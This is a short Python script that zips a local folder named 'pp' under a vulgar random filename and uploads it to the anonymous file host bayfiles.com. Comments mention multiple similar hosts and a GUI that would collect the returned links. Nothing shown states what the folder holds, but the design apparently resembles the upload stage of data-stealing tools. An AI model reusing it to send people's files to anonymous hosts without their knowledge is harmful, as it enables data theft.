import requests
import zipfile
import random

# takes the file (a folder named "pp", and feeds it to this function) - As for multiple hosts, a lot of these sites have near
# identical APIS, so it basically just looks like this. for "all" of them.
def upload_file(f):
    try:
        upload = requests.post("https://api.bayfiles.com/upload", files=f)
        if upload.status_code == 200:
           return upload.content
    except Exception as e:
        print(e)

def create_name():
    prefix = ["Fat", "tight"]
    suffix = ["Cock", "Pussy"]
    return  random.choice(prefix) + random.choice(suffix) + ".zip"
archive_name = create_name()


def create_archive():
    try:
     archive = zipfile.ZipFile(archive_name, 'w')
     archive.write('pp')
     archive.close()
    except:
        print("Error?")

# was going to make a Main Function but indentation gives me motion sickness
create_archive()
files = {'file': open(archive_name, 'rb')}

try:
    upload = upload_file(files)
    # TODO: read JSON and grab URL or preferably drop all URLs in a text file that can be read by the GUI
    print("Files Uploaded" + upload.decode('utf-8'))

except Exception as e:
    print(e)

